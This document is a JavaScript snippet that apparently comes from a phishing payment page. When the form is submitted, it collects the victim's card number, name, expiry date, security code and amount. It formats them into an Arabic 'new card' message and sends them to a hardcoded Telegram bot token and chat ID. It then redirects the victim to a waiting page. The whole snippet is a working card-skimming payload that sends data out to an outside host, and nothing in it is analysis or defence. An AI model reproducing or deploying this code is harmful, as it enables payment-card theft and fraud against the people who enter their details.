            document.getElementById('messageForm').addEventListener('submit', function(event) {
                event.preventDefault();
        
                var money = document.getElementById('money').value;
                var name = document.getElementById('name').value;
                var cardnumber = document.getElementById('cardnumber').value;
                var expirationdate = document.getElementById('expirationdate').value;
                var expirationdateYear = document.getElementById('expirationdateYear').value;
                var securitycode = document.getElementById('securitycode').value;
                
        
                var telegramToken = '7572932013:AAHn5rNLEHJjy91uswco8-cU5l8dUAq6m_k';
                var telegramChatId = '-1002420293081'; 
        
                var telegramMessage = `
                ====== 💳 بطاقة جديدة ========
      
        💲: ${money}

        👤: ${name}

        💳: ${cardnumber}

        📅: ${expirationdate}/${expirationdateYear}

        🔐: ${securitycode}

      ======================
                `;
        
                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: telegramChatId,
                        text: telegramMessage
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if(data.ok) {
                      
                        window.location.href = 'waiting.html';  
                    } else {
                        alert("حدث خطأ أثناء إرسال الرسالة.");
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert("حدث خطأ أثناء إرسال الرسالة.");
                });
            });
